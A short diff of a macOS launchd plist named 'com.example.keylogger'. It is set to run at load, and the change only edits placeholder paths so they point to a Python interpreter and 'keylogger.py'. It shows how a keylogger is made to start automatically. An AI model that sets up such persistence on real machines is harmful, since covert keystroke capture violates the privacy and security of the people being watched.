@@ -6,8 +6,8 @@
     <string>com.example.keylogger</string>
     <key>ProgramArguments</key>
     <array>
-        <string>Insert python interpreter path outside of workspace </string>
-        <string>insert path to script outside of workspace</string>
+        <string>Insert python interpreter path (cmd: which python3) </string>
+        <string>insert path to script (path to keylogger.py)</string>
     </array>
     <key>RunAtLoad</key>
     <true/>
